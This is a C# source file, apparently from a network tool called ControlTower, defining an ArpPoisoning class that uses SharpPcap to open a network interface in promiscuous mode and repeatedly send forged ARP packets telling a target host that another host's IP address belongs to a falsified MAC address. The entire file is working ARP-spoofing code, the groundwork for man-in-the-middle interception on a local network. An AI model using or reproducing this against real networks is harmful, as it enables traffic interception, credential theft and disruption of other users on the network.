using ControlTower.Network.Common;
using ControlTower.Network.Data;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using System;
using System.Net;
using System.Net.NetworkInformation;

namespace ControlTower
{
    public class ArpPoisoning : Threadable
    {
        /// <summary>
        /// Say to '<paramref name="target"/>' that '<paramref name="sender"/>' is '<paramref name="falsifiedSender"/>'
        /// </summary>
        /// <param name="target"></param>
        /// <param name="sender"></param>
        /// <param name="falsifiedSender"></param>
        public ArpPoisoning(Host target, Host sender, Host falsifiedSender)
        {
            Target = target;
            Sender = sender;
            FalsifiedSender = falsifiedSender;
        }

        private LibPcapLiveDevice _device;

        public LibPcapLiveDevice Device
        {
            get;
            set;
        }

        protected override void OnStarting()
        {
            if (Target.IpAddress.Equals(Sender.IpAddress))
                throw new Exception("Target and Sender can't be same");

            _device = LibPcapLiveDeviceList.New()[Device.Name];
        }

        public Host Target { get; }

        public Host Sender { get; }

        public Host FalsifiedSender { get; }

        protected override void Run()
        {
            _device.Open(DeviceModes.Promiscuous, 50);

            // Création de de l'entrée.
            Packet arpPacket = CreateArpPacket(Sender.IpAddress, FalsifiedSender.MacAddress, Target.IpAddress, Target.MacAddress);

            while (!StopAsked)
            {
                _device.SendPacket(arpPacket);

                for (int i = 0; i < 30*2 && !StopAsked; ++i) // 30 secs
                    System.Threading.Thread.Sleep(WaitingThread/2);
            }

            _device.Close();
        }

        private Packet CreateArpPacket(IPAddress senderIpAddress, PhysicalAddress senderPhysicalAddress,
                                       IPAddress targetIpAddress, PhysicalAddress targetPhysicalAddress)
        {
            var arpPacket = new ArpPacket(ArpOperation.Request, PhysicalAddress.None, targetIpAddress, senderPhysicalAddress, senderIpAddress);

            return new EthernetPacket(_device.MacAddress, targetPhysicalAddress, EthernetType.Arp) { PayloadPacket = arpPacket };
        }
    }
}
